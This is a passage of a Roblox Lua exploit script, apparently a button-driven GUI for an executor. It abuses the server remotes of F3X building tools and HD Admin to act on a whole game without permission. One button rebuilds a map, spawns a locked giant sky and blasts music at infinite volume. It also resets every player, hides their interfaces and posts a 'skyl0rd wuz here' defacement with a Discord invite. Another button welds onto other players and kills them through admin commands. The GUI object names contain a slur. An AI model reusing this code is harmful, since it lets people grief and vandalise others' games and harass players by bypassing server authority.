					table.insert(Childrens[Datum[2]],Index)
				end
	
			end
		end
	
		function Proc(Index)
			if not Childrens[Index] then
				return
			end
	
			local Object = MappingInstances[Index]
			local Instances = {}
	
			if Index == 0 then
				Object = Parent
			end
	
			for _,v in ipairs(Childrens[Index]) do
				table.insert(Instances,MappingInstances[v])
			end
	
			if Object then
				tcall(Invoke,"SetParent",Instances,Object)
			else
				local Datum = Data.Items[Index]
				local P = MappingInstances[Datum[2]]
	
				if Datum[2] == 0 then
					P = Parent
				end
	
				local groupType
				if Datum[1] == Types.Model then
					groupType = "Model"
				elseif Datum[1] == Types.Folder then
					groupType = "Folder"
				end
	
				local Model = Invoke("CreateGroup",groupType,P,Instances)
	
				MappingInstances[Index] = Model
			end
	
			for _,v in ipairs(Childrens[Index]) do
				tcall(Proc,v)
			end
		end
	
		if Group then
			Proc(0)
		end
	
		repeat wait(); ThreadWatch:GarbageCollect() until #ThreadWatch.Threads <= 0
	
		print("Updating Part Properties...")
	
		local Meshes = {}
		local Textures = {}
		local Lights = {}
		local Decorations = {}
		local Parts = {}
	
	
		local naming = {}
	
		for Index,Datum in ipairs(Data.Items) do
	
			if IsAPart(Index) then
	
				local Anchored = ForcedAnchor or Datum[23] == 1
	
				ChangeSet(Parts,{
					["Part"] = MappingInstances[Index];
					["Size"] = Vector3.new(unpack(Support.Slice(Datum, 4, 6)));
					["CFrame"] = RealativeCFrame:ToWorldSpace(CFrame.new(unpack(Support.Slice(Datum, 7, 18))));
					["Color"] = Color3.new(Datum[19], Datum[20], Datum[21]);
					["Material"] = Enum.Material:FromValue(Datum[22]);
					["Anchored"] = Anchored;
					["CanCollide"] = Datum[24] == 1;
					["Reflectance"] = Datum[25];
					["Transparency"] = Datum[26];
					["Surfaces"]={
						["Top"] = Enum.SurfaceType:FromValue(Datum[27]);
						["Bottom"] = Enum.SurfaceType:FromValue(Datum[28]);
						["Front"] = Enum.SurfaceType:FromValue(Datum[29]);
						["Back"] = Enum.SurfaceType:FromValue(Datum[30]);
						["Left"] = Enum.SurfaceType:FromValue(Datum[31]);
						["Right"] = Enum.SurfaceType:FromValue(Datum[32]);
					};
				})
	
			end
	
			if not MappingInstances[Datum[2]] then
				continue
			end
	
			local Part = MappingInstances[Datum[2]]
	
			--MESHES
			if Datum[1] == Types.SpecialMesh then
				ChangeSet(Meshes,{
					["Part"] = Part;
					["VertexColor"] = Vector3.new(unpack(Support.Slice(Datum, 13, 15)));
					["MeshType"] = Enum.MeshType:FromValue(Datum[4]);
					["Scale"] = Vector3.new(unpack(Support.Slice(Datum, 10, 12)));
					["Offset"] = Vector3.new(unpack(Support.Slice(Datum, 7, 9)));
					["MeshId"] = Datum[5];
					["TextureId"] = Datum[6];
				})
			end
	
			--TEXTURES & DECALS
			if (Datum[1] == Types.Texture 
				or Datum[1] == Types.Decal)
			then
				ChangeSet(Textures,{
					["Part"] = Part;
					["TextureType"] = if Datum[1] == Types.Texture then "Texture" else "Decal";
					["Texture"] = Datum[4];
					["Transparency"] = Datum[5];
					["Face"] = Enum.NormalId:FromValue(Datum[6]);
					["StudsPerTileU"] = Datum[7];
					["StudsPerTileV"] = Datum[8];
				})
			end
	
	
			-- Lights
			if (Datum[1] == Types.PointLight 
				or Datum[1] == Types.SpotLight
				or Datum[1] == Types.SurfaceLight)
			then
				local LightTypeFromTypes = {
					[Types.PointLight] = "PointLight",
					[Types.SpotLight] = "SpotLight",
					[Types.SurfaceLight] = "SurfaceLight"
				}
	
				ChangeSet(Lights,{
					["Part"] = Part;
					["LightType"] = LightTypeFromTypes[Datum[1]];
					["Brightness"] = Datum[4];
					["Color"] = Color3.new(unpack(Support.Slice(Datum, 5, 7)));
					["Enabled"] = Datum[8] == 1;
					["Shadows"] = Datum[9] == 1;
					["Range"] = Datum[10];
					["Angle"] = Datum[11];
					["Face"] = if Datum[12] then Enum.NormalId:FromValue(Datum[12]) else nil;
				})
			end
	
			--DECORATIONS
	
			if Datum[1] == Types.Smoke then
				ChangeSet(Decorations,{
					["Part"] = Part;
					["DecorationType"] = "Smoke";
	
					["Enabled"] = Datum[4] == 1;
					["Color"] = Color3.new(unpack(Support.Slice(Datum, 5, 7)));
					["Size"] = Datum[8];
					["RiseVelocity"] = Datum[9];
					["Opacity"] = Datum[10];
				})
			end;
	
			if Datum[1] == Types.Fire then
				ChangeSet(Decorations,{
					["Part"] = Part;
					["DecorationType"] = "Fire";
	
					["Enabled"] = Datum[4] == 1;
					["Color"] = Color3.new(unpack(Support.Slice(Datum, 5, 7)));
					["SecondaryColor"] = Color3.new(unpack(Support.Slice(Datum, 8, 10)));
					["Heat"] = Datum[11];
					["Size"] = Datum[12];
				})
			end;
	
			if Datum[1] == Types.Sparkles then
				ChangeSet(Decorations,{
					["Part"] = Part;
					["DecorationType"] = "Sparkles";
	
					["Enabled"] = Datum[4] == 1;
					["SparkleColor"] = Color3.new(unpack(Support.Slice(Datum, 5, 7)));
				})
			end;
	
			if IsAPart(Index)
				or Datum[1] == Types.Model
				or Datum[1] == Types.Folder
			then
				if Datum[3] ~= '' and MappingInstances[Index] then
					if not naming[Datum[3]] then
						naming[Datum[3]] = {}
					end
					table.insert(naming[Datum[3]],MappingInstances[Index])
				end
			end
		end
	
		tcall(function()
			ApplyChange("CreateMeshes",Meshes,{"Part"})
			ApplyChange("SyncMesh",Meshes)
		end)
	
		tcall(function()
			ApplyChange("CreateTextures",Textures,{"Part","TextureType","Face"})
			ApplyChange("SyncTexture",Textures)
		end)
	
		tcall(function()
			ApplyChange("CreateLights",Lights,{"Part","LightType"})
			ApplyChange("SyncLighting",Lights)
		end)
	
		tcall(function()
			ApplyChange("CreateDecorations",Decorations,{"Part","DecorationType"})
			ApplyChange("SyncDecorate",Decorations,{"Part","Enabled","SparkleColor","Color","SecondaryColor","Heat","Size","RiseVelocity","Opacity"})
		end)
	
		do
			local function T(...)
				tcall(ApplyChange,...)
			end
			T("SyncColor",Parts,{"Part","Color"})
			T("SyncMaterial",Parts,{"Part","Material","Transparency","Reflectance"})
			T("SyncCollision",Parts,{"Part","CanCollide"})
			T("SyncSurface",Parts,{"Part","Surfaces"})
			T("SyncResize",Parts,{"Part","Size","CFrame"})
			T("SyncAnchor",Parts,{"Part","Anchored"})
		end
	
	
	
		for i,v in pairs(naming) do
			tcall(Invoke,"SetName", v, i)
		end
	
		repeat wait(); ThreadWatch:GarbageCollect() until #ThreadWatch.Threads <= 0
	
		print("Done!")
	
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
	
		local Players = game:GetService("Players")
		local workspace = game:GetService("Workspace")
		local player = Players.LocalPlayer
	
		local function findTool()
			local char = player.Character or player.CharacterAdded:Wait()
	
			for _, v in ipairs(char:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
	
			for _, v in ipairs(player.Backpack:GetChildren()) do
				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
					return v
				end
			end
		end
	
		local tool = findTool()
		if not tool then return end
	
		local remote = tool.SyncAPI.ServerEndpoint
		local function call(a)
			return remote:InvokeServer(unpack(a))
		end
	
		-- i dont used the b2s sky function anymore, i used this instead
		local hack = workspace:FindFirstChild("E")
		if hack then
			call({ "Remove", { hack } })
		end
	
		local char = player.Character or player.CharacterAdded:Wait()
		local hrp = char:WaitForChild("HumanoidRootPart")
		local cf = CFrame.new(hrp.Position + Vector3.new(0, 1000, 0))
	
		local sky = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
	
		task.spawn(function()
			call({ "SyncAnchor", { { Part = sky, Anchored = true } } })
		end)
	
		task.spawn(function()
			call({ "SyncCollision", { { Part = sky, CanCollide = false } } })
		end)
	
		task.spawn(function()
			call({ "CreateMeshes", { { Part = sky } } })
		end)
	
		task.spawn(function()
			call({
				"SyncMesh",
				{{
					Part = sky,
					MeshId = "rbxassetid://111891702759441",
					TextureId = "rbxassetid://108547683799586",
					Scale = Vector3.new(100999, 100999, 100999),
					VertexColor = Vector3.new(3.6, 3.6, 3.6)
				}}
			})
		end)
	
		task.spawn(function()
			call({ "SetLocked", { sky }, true })
		end)
	
		task.spawn(function()
			call({ "SetName", { sky }, "E" })
		end)
	
		task.spawn(function()
			call({ "SyncMaterial", { { Part = sky, Transparency = 0 } } })
		end)
	
		task.spawn(function()
			call({ "SyncMove", { { Part = sky, CFrame = cf } } }) -- fe bypass rel
		end)
	
	
	
	
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";res all")
		RequestCommandSilent:InvokeServer(";hideguis all")
		RequestCommandSilent:InvokeServer(";uncmdbar2 all")
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommandSilent:InvokeServer(";music 125222324012294 ;pitch 0.09 ;volume inf")
	
		RequestCommandSilent:InvokeServer(";sm Welcome To Skyl0rd's Realm We Have Destoryed it because ur skiddie or the map was ruined bc of u.")
		RequestCommandSilent:InvokeServer(";serverhint  join .ggRrHmZKyG")
		RequestCommandSilent:InvokeServer(";serverhint skyl0rd wuz here!1")
	
	
	
		--                                                           ^ put a command like ;fly
		--i just have that nga, of you want more dm me at roadblockswashere
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_33);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_35()
local script = G2L["35"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";fogcolor black")
		RequestCommandSilent:InvokeServer(";time 010")
	
	--[[ 
	ok vro cuz my script have errors with getgenv and obfuscators not working,here the source.
	== Epik spinning sky f3x By ItsKittyyyGD ==
	Dont skid and give credit plz
	also reuploaded cuz scriptblox put my script on scripts f3x of 2024 
	]]
		-- { SOURCE: } --
	
	
		local Players = game:GetService("Players")
		local RunService = game:GetService("RunService")
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local tool
	
		for _, obj in player:GetDescendants() do
			if obj.Name == "SyncAPI" then
				tool = obj.Parent
			end
		end
	
		for _, obj in game.ReplicatedStorage:GetDescendants() do
			if obj.Name == "SyncAPI" then
				tool = obj.Parent
			end
		end
	
		local SyncAPI = tool.SyncAPI
		local part
		local baseCF
		local angle = 0
		local connection
	
		local function _(args)
			SyncAPI:Invoke(unpack(args))
		end
	
		local function CreatePart(cf, parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		local function SetAnchor(p, anchored)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = p,
						["Anchored"] = anchored
					}
				}
			}
			_(args)
		end
	
		local function AddMesh(p)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = p
					}
				}
			}
			_(args)
		end
	
		local function SetMesh(p, meshId)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["MeshId"] = "rbxassetid://"..meshId
					}
				}
			}
			_(args)
		end
	
		local function SetTexture(p, textureId)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["TextureId"] = textureId
					}
				}
			}
			_(args)
		end
	
		local function ResizeMesh(p, size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = p,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		local function SetTransparency(p, value)
			local args = {
				[1] = "SyncTransparency",
				[2] = {
					[1] = {
						["Part"] = p,
						["Transparency"] = value
					}
				}
			}
			_(args)
		end
	
		local function SyncRotate(cf)
			if not part or not part.Parent then return end
			local args = {
				[1] = "SyncRotate",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
	
		local function Sky()
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if not hrp then return end
			local startCF = hrp.CFrame + Vector3.new(0,6,0)
			CreatePart(startCF, workspace)
			for _, obj in workspace:GetDescendants() do
				if obj:IsA("BasePart") and (obj.Position - startCF.Position).Magnitude < 0.1 then
					part = obj
					baseCF = part.CFrame
					SetAnchor(part,true)
					AddMesh(part)
					SetMesh(part,"111891702759441")
					SetTexture(part,"rbxassetid://123353884007692")
					ResizeMesh(part, Vector3.new(6000,6000,6000))
					SetTransparency(part,0)
					-- i think you taking this so give credit
					local rotation = math.rad(100)
					connection = RunService.Heartbeat:Connect(function(dt)
						if not part or not part.Parent then
							if connection then
								connection:Disconnect()
								connection = nil
							end
							return
						end
						angle += rotation * dt
						local cf = baseCF * CFrame.Angles(5, angle, 1)
						SyncRotate(cf)
						part.CFrame = cf
					end)
					break
				end
			end
		end
	
		Sky()
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_35);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_37()
local script = G2L["37"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
	
		-- knife f3x 
	
		local player = game.Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local RunService = game:GetService("RunService")
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification
	
	
		local Players = game:GetService("Players")
	
		local UserInputService = game:GetService("UserInputService")
	
		if not character:FindFirstChild('Accessory (KNIF4ELERFTAccessory)') or character:FindFirstChild("Accessory (Knife McGrabbington III)") then
			ready = false
	
			local function notify(msg)
				local MainGUI = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI")
				if not MainGUI then
					MainGUI = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
					MainGUI.Name = "MainGUI"
				end
	
				coroutine.wrap(function()
					for _, v in pairs(MainGUI:GetChildren()) do
						if v:IsA("TextLabel") then v:Destroy() end
					end
	
					local TextLabel = Instance.new("TextLabel")
					local Frame = Instance.new("Frame")
	
					TextLabel.Parent = MainGUI
					TextLabel.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
					TextLabel.BorderSizePixel = 0
					TextLabel.Position = UDim2.new(0.2, 0, 0.05, -10)
					TextLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
					TextLabel.Font = Enum.Font.SourceSans
					TextLabel.TextColor3 = Color3.new(1, 1, 1)
					TextLabel.TextSize = 35
					TextLabel.TextScaled = true
					TextLabel.TextYAlignment = Enum.TextYAlignment.Center
					TextLabel.TextXAlignment = Enum.TextXAlignment.Left
					TextLabel.Text = ""
					TextLabel.BackgroundTransparency = 1
	
					Frame.Parent = TextLabel
					Frame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
					Frame.BorderSizePixel = 0
					Frame.Transparency = 1
					Frame.Position = UDim2.new(0, 0, 1, 0)
					Frame.Size = UDim2.new(1, 0, 0, 5)
	
					for i = 1, 8 do
						TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency - 0.1
						TextLabel.Position = TextLabel.Position + UDim2.new(0, 0, 0, 1)
						Frame.Transparency = Frame.Transparency - 0.1
						task.wait()
					end
	
					msg = "  " .. msg
					for i = 1, #msg do
						TextLabel.Text = string.sub(msg, 1, i)
						task.wait()
					end
	
					task.wait(1)
	
					for i = 1, 8 do
						TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency + 0.1
						TextLabel.Position = TextLabel.Position - UDim2.new(0, 0, 0, 2)
						Frame.Transparency = Frame.Transparency + 0.1
						task.wait()
					end
					TextLabel:Destroy()
				end)()
			end
	
	
			RequestCommand:InvokeServer(";hat me 18268136683")
	
			yeah=player.Backpack:FindFirstChild('Building Tools') or player.Backpack:FindFirstChild('F3X Btools!')
			if yeah then
				notify("This game has f3x/you have f3x so everyone gonna see what you're doing.")
				task.wait(3)
				notify("Press 'Z' to equip.")
			elseif not yeah then
				notify("LOL this game has no btools or f3x so this not gonna work here")
			end
	
			local tool
			for _, v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for _, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
	
			local remote = tool.SyncAPI.ServerEndpoint
	
			function _(args)
				remote:InvokeServer(unpack(args))
			end
			function SetCollision(part, boolean)
				local args = {
					[1] = "SyncCollision",
					[2] = {
						[1] = {
							["Part"] = part,
							["CanCollide"] = boolean
						}
					}
				}
				_(args)
			end
			function SetLocked(part,boolean)
				local args = {
					[1] = "SetLocked",
					[2] = {
						[1] = part
					},
					[3] = boolean
				}
				_(args)
			end
			function yerpp(E)
				local argsCreate = {
					[1] = "CreateDecorations",
					[2] = {
						[1] = {
							["Part"] = E,
							["DecorationType"] = "Sparkles"
						}
					}
				}
	
	
				local argsSync = {
					[1] = "SyncDecorate",
					[2] = {
						[1] = {
							["Part"] = E,
							["DecorationType"] = "Sparkles",
							["SparkleColor"] = Color3.fromRGB(255, 255, 0)
						} 
					} 
				}
				_(argsCreate)
				_(argsSync)
			end
	
			local knfe = character["Accessory (Knife McGrabbington III)"]
	
			if knfe then
				local args = {
					"Remove",
					{
						knfe.Handle.SpecialMesh
					}
				}
	
				_(args)
			end
	
			local function Resize(part, size, ha)
				local args = {
					"SyncResize",
					{
						{
							Part = part,
							CFrame = ha,
							Size = size
						}
					}
				}
				_(args)
			end
	
			local function SetAnchor(boolean, part)
				local args = {
					"SyncAnchor",
					{
						{
							Part = part,
							Anchored = boolean
						}
					}
				}
				_(args)
			end
	
			function MovePart(part, cf)
				local args = {
					[1] = "SyncMove",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf
						}
					}
				}
				_(args)
			end
	
			local function Color(part, color)
				local args = {
					"SyncColor",
					{
						{
							Part = part,
							Color = color,
							UnionColoring = false
						}
					}
				}
				_(args)
			end
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
	
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
	
			function SetMesh(part,meshid,offseter)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Offset"] = offseter,
							["Part"] = part,
							["MeshId"] = "rbxassetid://"..meshid
						}
					}
				}
				_(args)
			end
			function SetTexture(part, texid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["TextureId"] = "rbxassetid://" .. texid
						}
					}
				}
				_(args)
			end
	
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
	
			spawn(function()
				yerpp(knfe.Handle)
			end)
			spawn(function()
				AddMesh(knfe.Handle)
			end)
			spawn(function()
				SetMesh(knfe.Handle, "18114736783",Vector3.new(0, 0, 0))
			end)
			spawn(function()
				SetTexture(knfe.Handle, "80617091791234")
			end)
	
			function bleed(target)
				if not target or not target.Character then return end
	
				local stopBleeding = false
				local activeBloodParts = {} 
				local characterConnection
				characterConnection = target.CharacterAdded:Connect(function()
					stopBleeding = true
	
					for _, blood in pairs(activeBloodParts) do
						if blood and blood.Parent then
							DestroyPart(blood)
						end
					end
					if characterConnection then
						characterConnection:Disconnect()
					end
				end)
	
	
				coroutine.wrap(function()
					while not stopBleeding and target and target.Character do
						local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
						local rootPart = target.Character:FindFirstChild("HumanoidRootPart")
	
						if rootPart then
	
							coroutine.wrap(function()
								yez=CFrame.new(0,-10,0)
								local blood = remote:InvokeServer("CreatePart", "Ball", yez, target.Character)
								if blood then
									table.insert(activeBloodParts, blood)
	
									spawn(function()
										Color(blood, Color3.fromRGB(255, 0, 0))
									end)
	
									spawn(function()
										Resize(blood, Vector3.new(0.2, 0.2, 0.2), rootPart.CFrame + Vector3.new(math.random(-1,1),0,math.random(-1,1)))
									end)
									spawn(function()
										SetAnchor(false, blood)
									end)
									coroutine.wrap(function()
										wait(2)
										Resize(blood, Vector3.new(0.8, 0.1, 0.8),blood.CFrame)
										Resize(blood, Vector3.new(0.9, 0.1, 0.9),blood.CFrame)
										SetTrans(blood, 0.9)
										SetTrans(blood, 0.7)
										SetTrans(blood, 0.5)
										SetTrans(blood, 0.3)
										SetTrans(blood, 0.1)
										DestroyPart(blood)
	
	
										for i, v in pairs(activeBloodParts) do
											if v == blood then
												table.remove(activeBloodParts, i)
												break
											end
										end
									end)()
								end
							end)()
						end
	
						wait(0.005)
					end
				end)()
			end
	
			function c0lefect(E)
				local argsCreate = {
					[1] = "CreateDecorations",
					[2] = {
						[1] = {
							["Part"] = E,
							["DecorationType"] = "Sparkles"
						}
					}
				}
	
	
				local argsSync = {
					[1] = "SyncDecorate",
					[2] = {
						[1] = {
							["Part"] = E,
							["DecorationType"] = "Sparkles",
							["SparkleColor"] = Color3.fromRGB(255, 255, 0)
						} 
					} 
				}
	
				local args = {
					"Remove",
					{
						E:FindFirstChild('Sparkles')
					}
				}
	
	
	
				_(argsCreate)
				_(argsSync)
				task.wait(1)
				_(args)
			end
	
	
			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
	
			end
			function breakWelds(part)
				local welds = {}
				for _, weld in ipairs(part:GetDescendants()) do
					if weld:IsA("WeldConstraint") or weld:IsA("Weld") or weld:IsA("Motor6D") then
						table.insert(welds, weld)
					end
				end
	
				if #welds == 0 then
					return false
				end
	
				local args = {
					"RemoveWelds",
					welds
				}
				_(args)
				return true
			end
	
			local humanoid = character:FindFirstChildOfClass("Humanoid")
	
			local arm = character:FindFirstChild("Right Arm") and character:FindFirstChild("Left Arm") and character:FindFirstChild("Torso") 
			local holdAnimation = Instance.new("Animation")
			holdAnimation.AnimationId = "rbxassetid://48146273"
			local holdTrack = humanoid:LoadAnimation(holdAnimation)
	
			local killAnimation = Instance.new("Animation")
			killAnimation.AnimationId = "rbxassetid://48146273"
			local killTrack = humanoid:LoadAnimation(killAnimation)
	
			local knifeHoldAnim = Instance.new("Animation")
			knifeHoldAnim.AnimationId = "rbxassetid://299225058"
	
			local staffupAnim = Instance.new("Animation")
			staffupAnim.AnimationId = "rbxassetid://27432691"
	
			local swordhitAnim = Instance.new("Animation")
			swordhitAnim.AnimationId = "rbxassetid://27432686"
	
			local holdstaffAnim = Instance.new("Animation")
			holdstaffAnim.AnimationId = "rbxassetid://57794492"
	
			local stabAnim = Instance.new("Animation")
			stabAnim.AnimationId = "rbxassetid://30174375"
	
	
			local track1 = humanoid:LoadAnimation(staffupAnim)
			local track2 = humanoid:LoadAnimation(swordhitAnim)
			holdTrack = humanoid:LoadAnimation(holdstaffAnim)
	
	
	
	
			function GrabAnim()
				track1.Looped = false
				track2.Looped = false
				holdTrack.Looped = false
	
				track1:Play()
				track1.Stopped:Wait()
	
				track2:Play()
				track2.Stopped:Wait()
	
				holdTrack:Play()
				holdTrack:AdjustSpeed(0)
			end
	
			function Kill()
				local stabTrack = humanoid:LoadAnimation(stabAnim)
				stabTrack.Looped = false
				stabTrack:Play()
				stabTrack.Stopped:Wait()
	
				if holdTrack then holdTrack:Stop() end
			end
	
	
			function failed()
				track1.Looped = false
				track2.Looped = false
				holdTrack.Looped = false
	
				track1:Play()
				track1:AdjustSpeed(3)
				track1.Stopped:Wait()
	
	
				holdTrack:Play()
				wait(0.3)
				holdTrack:Stop()
			end
	
	
			local isBusy = false
			local alignPosition
			local alignOrientation
	
			local Players = game:GetService("Players")
			local player = Players.LocalPlayer 
	
			local function attachBehind(targetChar)
				local root = character:FindFirstChild("HumanoidRootPart")
				local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
				if root and targetRoot then
	
					local attachment0 = root:FindFirstChild("Attachment") or Instance.new("Attachment", root)
					local attachment1 = targetRoot:FindFirstChild("Attachment") or Instance.new("Attachment", targetRoot)
	
	
					alignPosition = Instance.new("AlignPosition")
					alignPosition.MaxForce = 1000000
					alignPosition.Responsiveness = 200
					alignPosition.Attachment0 = attachment0
					alignPosition.Attachment1 = attachment1
					alignPosition.Parent = root
					alignOrientation = Instance.new("AlignOrientation")
					alignOrientation.MaxTorque = 1000000
					alignOrientation.Responsiveness = 200
					alignOrientation.Attachment0 = attachment0
					alignOrientation.Attachment1 = attachment1
					alignOrientation.Parent = root
	
	
					attachment1.Position = Vector3.new(0, 0, 0.5)
				end
			end
	
			local function detach()
				if alignPosition then
					alignPosition:Destroy()
					alignPosition = nil
				end
				if alignOrientation then
					alignOrientation:Destroy()
					alignOrientation = nil
				end
			end
	
			local function attacke()
				if isBusy then return end
				isBusy = true
	
				local hitPlayer = nil
				local touchedConnection
	
				local function onTouch(other)
					local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
					if otherPlayer and otherPlayer ~= player then
						hitPlayer = otherPlayer
					end
				end
	
				touchedConnection = arm.Touched:Connect(onTouch)
				task.wait(0.15)
				if touchedConnection then
					touchedConnection:Disconnect()
				end
	
				if hitPlayer and hitPlayer.Character then
	
					RequestCommand:InvokeServer(";speed " ..hitPlayer.Name.. " 0")
	
	
					track1.Looped = false
					track2.Looped = false
					holdTrack.Looped = false
	
					track1:Play()
					track1.Stopped:Wait()
	
					track2:Play()
					track2:AdjustSpeed(3)
					track2.Stopped:Wait()
	
					holdTrack:Play()
	
					holdTrack:AdjustSpeed(0)
					spawn(function()
						attachBehind(hitPlayer.Character)
						wait(0.8)
						detach()
					end)
					spawn(function()
						SetLocked(hitPlayer.Character.Torso, false)
					end)
					spawn(function()
						SetLocked(char.Torso, false)
					end)
					Weld(character.Torso,hitPlayer.Character.Torso,character.Torso)
					Weld(character.Torso,hitPlayer.Character.HumanoidRootPart,character.Torso)
					Weld(character.Torso,hitPlayer.Character.Head,character.Torso)
	
	
					wait(3)
					spawn(function()
						Kill()
					end)
					bleed(hitPlayer)
					wait(0.5)
					RequestCommand:InvokeServer(";kill " ..hitPlayer.Name)
					wait(0.5)
					breakWelds(character.Torso)
					breakWelds(hitPlayer.Character.Torso)
					spawn(function()
						wait(0.8)
	
						spawn(function()
							SetLocked(hitPlayer.Character.Torso, false)
						end)
						spawn(function()
							SetLocked(hitPlayer.Character["Right Arm"], false)
						end)
						spawn(function()
							SetLocked(hitPlayer.Character["Left Arm"], false)
						end)
						spawn(function()
							SetLocked(hitPlayer.Character["Right Leg"], false)
						end)
						spawn(function()
							SetLocked(hitPlayer.Character["Left Leg"], false)
						end)
	
						spawn(function()
							SetCollision(hitPlayer.Character.Torso, true)
						end)
						spawn(function()
							SetCollision(hitPlayer.Character["Right Arm"], true)
						end)
						spawn(function()
							SetCollision(hitPlayer.Character["Left Arm"], true)
						end)
						spawn(function()
							SetCollision(hitPlayer.Character["Right Leg"], true)
						end)
						spawn(function()
							SetCollision(hitPlayer.Character["Left Leg"], true)
						end)
					end)
	
					wait(0.3)
	
	
					isBusy = false
	
	
				else
	
					failed()
					wait(0.4)
					isBusy = false
				end
			end
	
	
	
	
			UserInputService.InputBegan:Connect(function(input, gameProcessed)
				if gameProcessed then return end
	
				if input.KeyCode == Enum.KeyCode.Z then
					local args = {
						"Remove",
						{
							knfe.Handle
						}
					}
					_(args)
					knfe:Destroy()
	
					RequestCommand:InvokeServer(";hat me 18420472059")
					wait(1)
					local knife = character:FindFirstChild("Accessory (KNIF4ELERFTAccessory)")
	
					spawn(function()
						local args = {
							"Remove",
							{
								knife.Handle.SpecialMesh
							}
						}
						_(args)
					end)
	
					spawn(function()
						AddMesh(knife.Handle)
					end)
					spawn(function()
						SetMesh(knife.Handle, "18114736783", Vector3.new(0, 0,-0.25))
					end)
					spawn(function()
						SetTexture(knife.Handle, "80617091791234")
					end)
	
					ready = true
				end 
			end)
	
	
	
	
			UserInputService.TouchTap:Connect(function(input, gameProcessed)
				if gameProcessed then return end
				if ready == true then
					attacke()
				end
			end)
	
		end
	
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_37);
-- StarterGui.ScreenGui.nigg.ScrollingFrame.TextButton.LocalScript
local function C_39()
local script = G2L["39"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		--[[
	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠁⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
